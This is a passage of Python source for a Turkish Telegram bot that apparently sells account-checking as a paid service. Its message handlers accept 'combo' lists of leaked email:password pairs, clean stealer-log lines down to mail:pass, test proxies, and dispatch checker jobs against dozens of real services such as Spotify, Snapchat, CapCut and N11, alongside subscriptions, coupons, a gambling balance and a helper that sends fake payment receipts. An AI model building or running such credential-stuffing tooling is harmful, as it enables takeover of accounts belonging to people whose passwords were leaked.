    stars = (admin_temp_data.get(chat_id) or {}).get("pending_bot_rate")
    if not stars:
      user_states.pop(chat_id, None)
      bot.send_message(chat_id, "❌ Oturum yok. Menüden tekrar puan ver.")
      return
    raw = (message.text or "").strip()
    low_max = int(globals().get("BOT_RATE_LOW_MAX", 2) or 2)
    if stars > low_max and raw.lower() in ("atla", "skip", "-", "yok", "."):
      comment = ""
    else:
      comment = raw
    if stars <= low_max and len(comment) < 5:
      bot.send_message(
        chat_id,
        f"❌ **{stars}⭐** için en az **5 karakter** açıklama yaz.\nİptal: /iptal",
        parse_mode="Markdown",
      )
      return
    user_states.pop(chat_id, None)
    admin_temp_data.pop(chat_id, None)
    ok, msg = submit_bot_rating(user_id, stars, comment)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("💬 Yorumları Gör", callback_data="rate_bot_reviews"))
    markup.add(types.InlineKeyboardButton("📊 Özet", callback_data="rate_bot_menu"))
    markup.add(types.InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu"))
    bot.send_message(chat_id, msg + "\n\n" + bot_rating_summary_text(), reply_markup=markup, parse_mode="Markdown")
    return

  elif state == "waiting_premium_code":
    code = (message.text or "").strip()
    if code.lower() in ("/iptal", "iptal", "cancel"):
      user_states.pop(chat_id, None)
      bot.send_message(chat_id, "Iptal.")
      return
    user_states.pop(chat_id, None)
    ok, msg = redeem_premium_code(user_id, code)
    if ok:
      markup = types.InlineKeyboardMarkup()
      markup.add(types.InlineKeyboardButton("Checker", callback_data="menu_checker"))
      bot.send_message(chat_id, "Kod kabul!\n\n" + str(msg).replace("**", ""), reply_markup=markup)
    else:
      bot.send_message(chat_id, str(msg))
    return

  elif state == "waiting_gift_custom_code":
    raw = (message.text or "").strip()
    if raw.lower() in ("/iptal", "iptal", "cancel"):
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      bot.send_message(chat_id, "Iptal.")
      return
    meta = admin_temp_data.get(chat_id) or {}
    plan_key = meta.get("sub_plan")
    pay = meta.get("sub_pay") or "balance"
    if not plan_key or plan_key not in CHECKER_SUB_PLANS:
      user_states.pop(chat_id, None)
      bot.send_message(chat_id, "Oturum dustu.")
      return
    custom = raw.strip()
    if custom.lower() in ("auto", "rastgele", "random", "-"):
      custom = None
    else:
      custom = "".join(ch for ch in custom.upper() if ch.isalnum() or ch in ("_", "-"))
      if len(custom) < 4 or len(custom) > 24:
        bot.send_message(chat_id, "Kod 4-24 karakter. Tekrar yaz veya auto yaz.")
        return
      exist = premium_codes.get(custom)
      if exist and not exist.get("used_by"):
        bot.send_message(chat_id, "Bu kod zaten var, baska yaz.")
        return
    user_states.pop(chat_id, None)
    if pay == "stars":
      admin_temp_data[chat_id] = {"sub_plan": plan_key, "sub_pay": "stars", "gift_custom": custom}
      send_checker_sub_star_invoice(chat_id, user_id, plan_key, mode="gift")
      return
    ok, msg, code = buy_checker_sub_balance(user_id, plan_key, mode="gift", custom_code=custom)
    if ok and code:
      try:
        send_fake_sub_receipt(chat_id, user_id, plan_key, float(CHECKER_SUB_PLANS[plan_key]["tl"]), method="Bakiye / Hediye", gift_code=code)
      except Exception:
        pass
      bot.send_message(chat_id, "ODEME BASARILI\n\nHediye kodun:\n" + code + "\n\nPaket: " + CHECKER_SUB_PLANS[plan_key]["title"] + "\nSana abonelik yazilmadi.")
    else:
      bot.send_message(chat_id, str(msg))
    return

  elif state == "waiting_admin_custom_prem_code":
    if user_id not in admin_ids_set:
      user_states.pop(chat_id, None)
      return
    raw = (message.text or "").strip()
    if raw.lower() in ("/iptal", "iptal"):
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      bot.send_message(chat_id, "Iptal.")
      return
    meta = admin_temp_data.get(chat_id) or {}
    plan_key = meta.get("admin_prem_plan") or "30d"
    parts = raw.split()
    code_raw = parts[0] if parts else ""
    if len(parts) > 1 and parts[1] in CHECKER_SUB_PLANS:
      plan_key = parts[1]
    code_raw = "".join(ch for ch in code_raw.upper() if ch.isalnum() or ch in ("_", "-"))
    if len(code_raw) < 4:
      bot.send_message(chat_id, "Kod en az 4 karakter.")
      return
    exist = premium_codes.get(code_raw)
    if exist and not exist.get("used_by"):
      bot.send_message(chat_id, "Kod zaten mevcut.")
      return
    code, title = create_premium_gift_code(user_id, plan_key, via="admin", custom_code=code_raw)
    user_states.pop(chat_id, None)
    try:
      admin_temp_data.pop(chat_id, None)
    except Exception:
      pass
    if code:
      bot.send_message(chat_id, "Admin hediye kodu:\n" + code + "\nPaket: " + str(title))
    else:
      bot.send_message(chat_id, str(title))
    return

  elif state == "waiting_coupon_code":
    if not message.text:
      bot.send_message(chat_id, "❌ Lütfen kupon kodunu yazın.")
      return
    matched_key = find_coupon_key(message.text)
    user_states.pop(chat_id, None)
    if matched_key is None:
      bot.send_message(chat_id, "❌ Geçersiz veya bulunamayan kupon kodu!")
      return
    cdata = coupons[matched_key]
    if not isinstance(cdata, dict):
      cdata = {"value": float(cdata), "max_uses": 1, "used_count": 0, "expires_at": None, "min_level": 1}
      coupons[matched_key] = cdata
    ok, reason = coupon_is_valid(cdata, user_id)
    if not ok:
      bot.send_message(chat_id, f"❌ Kupon kullanılamaz: {reason}")
      return
    c_val = float(cdata["value"])
    cdata["used_count"] = int(cdata.get("used_count", 0)) + 1
    if cdata["used_count"] >= cdata.get("max_uses", 1):
      del coupons[matched_key]
    else:
      coupons[matched_key] = cdata
    user_balances[user_id] = user_balances.get(user_id, 0.0) + c_val
    add_balance_history(user_id, "coupon", c_val, f"Kupon: {matched_key}")
    add_xp(user_id, 5)
    add_notification(user_id, f"+{c_val:.2f} TL kupon ({matched_key})")
    log_activity("coupon_use", user_id, f"{matched_key}:{c_val}")
    grant_achievement(user_id, "first_coupon")
    save_data()
    left = ""
    if matched_key in coupons:
      left = f"\n📦 Kalan kullanım: **{coupons[matched_key]['max_uses'] - coupons[matched_key]['used_count']}**"
    bot.send_message(
      chat_id,
      f"🎉 **Kupon Kullanıldı!**\n\n🎟️ Kod: `{matched_key}`\n💵 **+{c_val:.2f} TL** bakiyenize eklendi.\n💳 Kumar Bakiyesi: **{get_gamble_bal(user_id):.2f} TL**{left}",
      parse_mode="Markdown"
    )
    return

  elif state == "waiting_ticket_msg":
    t_id = str(uuid.uuid4())[:6]
    active_tickets[t_id] = {'user_id': user_id, 'msg': message.text}
    save_data()
    user_states.pop(chat_id, None)
    bot.send_message(chat_id, f"✅ Destek talebiniz açıldı. Talep ID: `{t_id}`", parse_mode="Markdown")

    admin_markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("✉️ Yanıtla", callback_data=f"answer_ticket_{t_id}"))
    for admin_id in admin_ids_set:
      try:
        bot.send_message(admin_id, f"🎫 **YENİ DESTEK TALEBİ!**\n🆔 ID: `{t_id}`\n👤 Kullanıcı: `{user_id}`\n💬 Mesaj: {message.text}", reply_markup=admin_markup, parse_mode="Markdown")
      except:
        pass
    return

  elif state == "waiting_admin_ticket_reply":
    t_id = admin_temp_data.get(chat_id, {}).get('answering_ticket_id')
    if t_id in active_tickets:
      target_uid = active_tickets[t_id]['user_id']
      try:
        bot.send_message(target_uid, f"✉️ **Destek Talebinize Yanıt Geldi (`{t_id}`):**\n\n{message.text}", parse_mode="Markdown")
        bot.send_message(chat_id, "✅ Yanıt gönderildi ve talep kapatıldı.")
      except:
        bot.send_message(chat_id, "❌ Kullanıcıya mesaj iletilemedi.")
      del active_tickets[t_id]
      save_data()
    user_states.pop(chat_id, None)
    admin_temp_data.pop(chat_id, None)
    return

  elif state == "waiting_withdraw_amount":
    try:
      w_amount = float(message.text.replace(",", "."))
      if w_amount <= 0 or w_amount > ref_balances.get(user_id, 0.0):
        bot.send_message(chat_id, "❌ Geçersiz veya yetersiz referans bakiyesi.")
        return
      if w_amount < min_withdraw:
        bot.send_message(chat_id, f"❌ Minimum çekim tutarı: **{min_withdraw:.0f} TL**", parse_mode="Markdown")
        return
      commission = w_amount * withdraw_commission
      net = w_amount - commission
      admin_temp_data[chat_id] = {'withdraw_amount': w_amount, 'withdraw_net': net, 'withdraw_commission': commission}
      user_states[chat_id] = "waiting_withdraw_iban"
      bot.send_message(chat_id, f"🏦 Çekim: **{w_amount:.2f} TL**\nKomisyon (%{withdraw_commission*100:.0f}): **{commission:.2f} TL**\nNet: **{net:.2f} TL**\n\n**IBAN / Papara / Cüzdan** yazın:", parse_mode="Markdown")
    except:
      bot.send_message(chat_id, "❌ Geçersiz miktar yazdınız.")
    return

  elif state == "waiting_withdraw_iban":
    w_amount = admin_temp_data.get(chat_id, {}).get('withdraw_amount')
    iban = message.text.strip()
    wd_id = str(uuid.uuid4())[:6]
    withdrawal_requests[wd_id] = {'user_id': user_id, 'amount': w_amount, 'iban': iban}
    save_data()

    user_states.pop(chat_id, None)
    admin_temp_data.pop(chat_id, None)
    bot.send_message(chat_id, "✅ Para çekme talebiniz iletildi.")

    admin_markup = types.InlineKeyboardMarkup().add(
      types.InlineKeyboardButton("✅ Onayla", callback_data=f"wd_approve_{wd_id}"),
      types.InlineKeyboardButton("❌ Reddet", callback_data=f"wd_reject_{wd_id}")
    )
    for admin_id in admin_ids_set:
      try:
        bot.send_message(admin_id, f"💸 **YENİ PARA ÇEKME TALEBİ!**\n🆔 `{user_id}`\n💵 Miktar: **{w_amount} TL**\n🏦 IBAN: `{iban}`", reply_markup=admin_markup, parse_mode="Markdown")
      except:
        pass
    return

  elif state == "waiting_strip_url":
    user_states.pop(chat_id, None)
    raw = message.text or ""
    if raw.strip().lower() in ("/iptal", "iptal", "cancel"):
      bot.send_message(chat_id, "❌ İptal edildi.")
      return
    cleaned = clean_log_lines_to_mail_pass(raw)
    if not cleaned:
      bot.send_message(chat_id, "❌ Geçerli email:password satırı bulunamadı.")
      return
    lines = cleaned.splitlines()
    header = f"🧹 **URL silindi** — {len(lines)} satır (sadece mail:pass)\n\n"
    if len(cleaned) < 3500:
      bot.send_message(chat_id, header + "```text\n" + cleaned + "\n```", parse_mode="Markdown")
    else:
      tmp = f"clean_mailpass_{user_id}.txt"
      try:
        with open(tmp, "w", encoding="utf-8") as f:
          f.write(cleaned + "\n")
        with open(tmp, "rb") as doc:
          bot.send_document(chat_id, doc, caption=f"🧹 URL silindi — {len(lines)} satır")
      finally:
        try:
          os.remove(tmp)
        except Exception:
          pass
    return

  elif state == "waiting_exxen":
    user_states.pop(chat_id, None)
    res = exxen_kontrol_et(message.text)
    bot.send_message(chat_id, res)
    return

  elif state in ("ai_chat", "ai_chat_nsfw"):
    text_in = (message.text or "").strip()
    if not text_in:
      return
    low = text_in.lower()
    mode = "nsfw" if state == "ai_chat_nsfw" else "normal"
    if low in ("/ai_cikis", "/iptal", "iptal", "çık", "cik", "exit"):
      active_ai_chat.discard(user_id)
      user_states.pop(chat_id, None)
      bot.send_message(chat_id, "👋 AI sohbet kapandı.")
      return
    try:
      wait = bot.send_message(chat_id, "⏳ Düşünüyorum...")
      wait_id = wait.message_id
    except Exception:
      wait_id = None

    def _ai_run(uid=user_id, txt=text_in, m=mode, cid=chat_id, wid=wait_id):
      reply = ai_ask(uid, txt, mode=m)
      try:
        if wid:
          bot.edit_message_text(reply[:4000], cid, wid)
        else:
          bot.send_message(cid, reply[:4000])
      except Exception:
        try:
          bot.send_message(cid, reply[:4000])
        except Exception:
          pass

    threading.Thread(target=_ai_run, daemon=True).start()
    return

  elif state == "waiting_checker_speed":
    if message.text and message.text.strip().lower() in ("/iptal", "iptal", "/cancel", "cancel"):
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      bot.send_message(chat_id, "❌ İptal edildi.")
      return
    raw = (message.text or "").strip()
    try:
      w = int(raw)
    except Exception:
      bot.send_message(
        chat_id,
        f"❌ **{CHECKER_SPEED_MIN}–{CHECKER_SPEED_MAX}** arası sayı yaz veya butona bas.",
        parse_mode="Markdown",
      )
      return
    if w < CHECKER_SPEED_MIN or w > CHECKER_SPEED_MAX:
      bot.send_message(
        chat_id,
        f"❌ Hız **{CHECKER_SPEED_MIN}** ile **{CHECKER_SPEED_MAX}** arasında olmalı.",
        parse_mode="Markdown",
      )
      return
    _start_pending_checker(chat_id, user_id, w)
    return

  elif state == "waiting_n11":
    combo_text = None
    if message.document:
      try:
        fname = (message.document.file_name or "").lower()
        if fname.endswith((".rar", ".zip", ".7z", ".gz", ".tar", ".bz2")):
          bot.send_message(
            chat_id,
            "❌ Arşiv kabul edilmez. Combo'yu **.txt** olarak gönder.",
            parse_mode="Markdown",
          )
          return
        if not (
          fname.endswith((".txt", ".log", ".csv"))
          or (message.document.mime_type or "").startswith("text")
          or not fname
        ):
          bot.send_message(chat_id, "❌ Sadece **.txt** gönder.", parse_mode="Markdown")
          return
        doc_size = getattr(message.document, "file_size", None) or 0
        if doc_size and doc_size > 20 * 1024 * 1024:
          bot.send_message(chat_id, "❌ Dosya çok büyük (max ~20 MB).")
          return
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        payload = (
          downloaded
          if isinstance(downloaded, (bytes, bytearray))
          else str(downloaded).encode("utf-8", errors="ignore")
        )
        combo_text = payload.decode("utf-8", errors="ignore")
        try:
          bot.send_message(
            chat_id,
            f"📄 Dosya alındı: `{message.document.file_name or 'combo.txt'}`\n🔍 N11 tarama başlıyor...",
            parse_mode="Markdown",
          )
        except Exception:
          pass
      except Exception as e:
        log_error("n11_doc", e)
        bot.send_message(chat_id, f"❌ Dosya okunamadı: {e}")
        return
    elif message.text:
      if message.text.strip().lower() in ("/iptal", "iptal", "/cancel", "cancel"):
        user_states.pop(chat_id, None)
        bot.send_message(chat_id, "❌ İptal edildi.")
        return
      combo_text = message.text.strip()
    else:
      bot.send_message(
        chat_id,
        "❌ Metin yaz **veya** 📎 **.txt** gönder.\nİptal: /iptal",
        parse_mode="Markdown",
      )
      return

    if not combo_text or not combo_text.strip():
      bot.send_message(chat_id, "❌ Boş içerik.")
      return
    ask_checker_speed(chat_id, user_id, combo_text.strip(), run_n11_check_and_send, "N11")
    return

  elif state == "waiting_cpmv2":
    if message.text and message.text.strip().lower() in ("/iptal", "iptal", "/cancel", "cancel"):
      user_states.pop(chat_id, None)
      bot.send_message(chat_id, "❌ İptal.")
      return
    combo_text = None
    if message.document:
      try:
        fname = (message.document.file_name or "").lower()
        if fname.endswith((".rar", ".zip", ".7z", ".gz", ".tar", ".bz2")):
          bot.send_message(chat_id, "❌ Arşiv kabul edilmez. **.txt** gönder.", parse_mode="Markdown")
          return
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        payload = (
          downloaded
          if isinstance(downloaded, (bytes, bytearray))
          else str(downloaded).encode("utf-8", errors="ignore")
        )
        combo_text = payload.decode("utf-8", errors="ignore")
      except Exception as e:
        bot.send_message(chat_id, f"❌ Dosya okunamadı: {e}")
        return
    elif message.text:
      combo_text = message.text
    else:
      bot.send_message(chat_id, "❌ Metin veya 📎 .txt gönder.\nİptal: /iptal")
      return
    if not combo_text or not str(combo_text).strip():
      bot.send_message(chat_id, "❌ Boş combo.")
      return
    try:
      track_checker_use(user_id)
    except Exception:
      pass
    ask_checker_speed(chat_id, user_id, str(combo_text).strip(), run_cpmv2_check_and_send, "CPM 2")
    return

  elif state == "waiting_cpm":
    combo_text = None
    if message.document:
      try:
        fname = (message.document.file_name or "").lower()
        if fname.endswith((".rar", ".zip", ".7z", ".gz", ".tar", ".bz2")):
          bot.send_message(
            chat_id,
            "❌ Arşiv (rar/zip) kabul edilmez.\nCombo'yu **.txt** olarak gönder.",
            parse_mode="Markdown",
          )
          return  # state kalsın, tekrar denesin
        if not (
          fname.endswith((".txt", ".log", ".csv"))
          or (message.document.mime_type or "").startswith("text")
          or not fname
        ):
          bot.send_message(chat_id, "❌ Sadece **.txt** (veya .log/.csv) gönder.", parse_mode="Markdown")
          return
        doc_size = getattr(message.document, "file_size", None) or 0
        if doc_size and doc_size > 20 * 1024 * 1024:
          bot.send_message(chat_id, "❌ Dosya çok büyük (max ~20 MB Telegram sınırı).")
          return
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        payload = (
          downloaded
          if isinstance(downloaded, (bytes, bytearray))
          else str(downloaded).encode("utf-8", errors="ignore")
        )
        combo_text = payload.decode("utf-8", errors="ignore")
        try:
          bot.send_message(
            chat_id,
            f"📄 Dosya alındı: `{message.document.file_name or 'combo.txt'}`\n🔍 Tarama başlıyor...",
            parse_mode="Markdown",
          )
        except Exception:
          pass
      except Exception as e:
        log_error("cpm_doc", e)
        bot.send_message(chat_id, f"❌ Dosya okunamadı: {e}")
        return
    elif message.text:
      if message.text.strip().lower() in ("/iptal", "iptal", "/cancel", "cancel"):
        user_states.pop(chat_id, None)
        bot.send_message(chat_id, "❌ İptal edildi.")
        return
      combo_text = message.text.strip()
    else:
      bot.send_message(
        chat_id,
        "❌ Metin yaz **veya** 📎 **.txt dosyası** gönder (combo).\nİptal: /iptal",
        parse_mode="Markdown",
      )
      return

    if not combo_text or not combo_text.strip():
      bot.send_message(chat_id, "❌ Boş içerik.")
      return
    ask_checker_speed(chat_id, user_id, combo_text.strip(), run_cpm_check_and_send, "CPM")
    return

  elif state == "waiting_s2gepin":
    combo_text, err = _extract_combo_from_message(message, chat_id, "S2GEPIN")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_s2gepin_check_and_send, "S2GEPIN")
    return

  elif state == "waiting_penti":
    combo_text, err = _extract_combo_from_message(message, chat_id, "PENTI")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_penti_check_and_send, "PENTI")
    return

  elif state == "waiting_candy":
    combo_text, err = _extract_combo_from_message(message, chat_id, "CANDY")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_candy_check_and_send, "CANDY")
    return

  elif state == "waiting_kurumedy":
    combo_text, err = _extract_combo_from_message(message, chat_id, "KURUMEDYA")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_kurumedy_check_and_send, "KURUMEDYA")
    return

  elif state == "waiting_smmturk":
    combo_text, err = _extract_combo_from_message(message, chat_id, "SMMTURK")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_smmturk_check_and_send, "SMMTURK")
    return

  elif state == "waiting_smpanel":
    combo_text, err = _extract_combo_from_message(message, chat_id, "SMPANEL")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_smpanel_check_and_send, "SMPANEL")
    return

  elif state == "waiting_worldofsmm":
    combo_text, err = _extract_combo_from_message(message, chat_id, "WORLDOFSMM")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_worldofsmm_check_and_send, "WORLDOFSMM")
    return

  elif state == "waiting_jap":
    combo_text, err = _extract_combo_from_message(message, chat_id, "JUSTANOTHERPANEL")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_jap_check_and_send, "JUSTANOTHERPANEL")
    return

  elif state == "waiting_vpazari":
    combo_text, err = _extract_combo_from_message(message, chat_id, "VPAZARI")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_vpazari_check_and_send, "VPAZARI")
    return

  elif state == "waiting_predunyam":
    combo_text, err = _extract_combo_from_message(message, chat_id, "PREDUNYAM")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_predunyam_check_and_send, "PREDUNYAM")
    return

  elif state == "waiting_mackolik":
    combo_text, err = _extract_combo_from_message(message, chat_id, "MACKOLIK")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_mackolik_check_and_send, "MACKOLIK")
    return

  elif state == "waiting_ozygame":
    combo_text, err = _extract_combo_from_message(message, chat_id, "OZYGAME")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_ozygame_check_and_send, "OZYGAME")
    return

  elif state == "waiting_capcut":
    combo_text, err = _extract_combo_from_message(message, chat_id, "CAPCUT")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_capcut_check_and_send, "CAPCUT")
    return

  elif state == "waiting_verisunucu":
    combo_text, err = _extract_combo_from_message(message, chat_id, "VERISUNUCU")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_verisunucu_check_and_send, "VERISUNUCU")
    return

  elif state == "waiting_smsonay":
    combo_text, err = _extract_combo_from_message(message, chat_id, "SMSONAY")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_smsonay_check_and_send, "SMSONAY")
    return

  elif state == "waiting_buraksmsonay":
    combo_text, err = _extract_combo_from_message(message, chat_id, "BURAKSMSONAY")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_buraksmsonay_check_and_send, "BURAKSMSONAY")
    return

  elif state == "waiting_fenix":
    combo_text, err = _extract_combo_from_message(message, chat_id, "FENIX")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_fenix_check_and_send, "FENIX")
    return

  elif state == "waiting_proxy_test":
    if message.text and message.text.strip().lower() in ("/iptal", "iptal", "/cancel"):
      user_states.pop(chat_id, None)
      bot.send_message(chat_id, "❌ İptal.")
      return
    raw = (message.text or "")
    if message.document:
      try:
        fi = bot.get_file(message.document.file_id)
        raw = bot.download_file(fi.file_path)
        if isinstance(raw, (bytes, bytearray)):
          raw = raw.decode("utf-8", errors="ignore")
      except Exception as e:
        bot.send_message(chat_id, f"❌ Dosya: {e}")
        return
    lines = [ln.strip() for ln in str(raw).splitlines() if ln.strip()][:30]
    if not lines:
      bot.send_message(chat_id, "❌ Proxy satırı yok.")
      return
    user_states.pop(chat_id, None)
    bot.send_message(chat_id, f"🔗 **{len(lines)}** proxy test ediliyor...")
    results = []
    ok_n = 0
    for ln in lines:
      ok, detail = test_proxy_line(ln)
      if ok:
        ok_n += 1
      results.append(f"{'✅' if ok else '❌'} `{ln[:40]}` — {detail}")
    bot.send_message(
      chat_id,
      f"🔗 **Proxy Test Sonucu**\n✅ {ok_n}/{len(lines)} çalışıyor\n\n" + "\n".join(results[:30]),
      parse_mode="Markdown",
    )
    return

  elif state == "waiting_flood_settings":
    if user_id not in admin_ids_set:
      user_states.pop(chat_id, None)
      return
    if message.text and message.text.strip().lower() in ("/iptal", "iptal"):
      user_states.pop(chat_id, None)
      bot.send_message(chat_id, "❌ İptal.")
      return
    parts = (message.text or "").strip().split()
    global MSG_SPAM_LIMIT, MSG_SPAM_TIME
    try:
      if parts[0].lower() == "limit" and len(parts) >= 3:
        MSG_SPAM_LIMIT = max(2, int(parts[1]))
        MSG_SPAM_TIME = max(1, int(parts[2]))
        try:
          cfg = load_config()
          cfg["MSG_SPAM_LIMIT"] = MSG_SPAM_LIMIT
          cfg["MSG_SPAM_TIME"] = MSG_SPAM_TIME
          with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(cfg, f, ensure_ascii=False, indent=4)
        except Exception:
          pass
        user_states.pop(chat_id, None)
        bot.send_message(chat_id, f"✅ Flood: **{MSG_SPAM_LIMIT}** mesaj / **{MSG_SPAM_TIME}s**", parse_mode="Markdown")
      else:
        bot.send_message(chat_id, "Format: `limit 8 3`")
    except Exception as e:
      bot.send_message(chat_id, f"❌ {e}")
    return

  elif state == "waiting_ezglobal":
    combo_text, err = _extract_combo_from_message(message, chat_id, "EZGLOBAL")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_ezglobal_check_and_send, "EZGLOBAL")
    return

  elif state == "waiting_epinfy":
    combo_text, err = _extract_combo_from_message(message, chat_id, "EPINFY")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_epinfy_check_and_send, "EPINFY")
    return

  elif state == "waiting_spotify":
    combo_text, err = _extract_combo_from_message(message, chat_id, "SPOTIFY")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_spotify_check_and_send, "SPOTIFY")
    return

  elif state == "waiting_snapchat":
    combo_text, err = _extract_combo_from_message(message, chat_id, "SNAPCHAT")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_snapchat_check_and_send, "SNAPCHAT")
    return

  elif state == "waiting_medyabayim":
    combo_text, err = _extract_combo_from_message(message, chat_id, "MEDYABAYIM")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_medyabayim_check_and_send, "MEDYABAYIM")
    return

  elif state == "waiting_bkm":
    combo_text, err = _extract_combo_from_message(message, chat_id, "BKM")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_bkm_check_and_send, "BKM")
    return

  elif state == "waiting_barlas":
    combo_text, err = _extract_combo_from_message(message, chat_id, "BARLAS")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
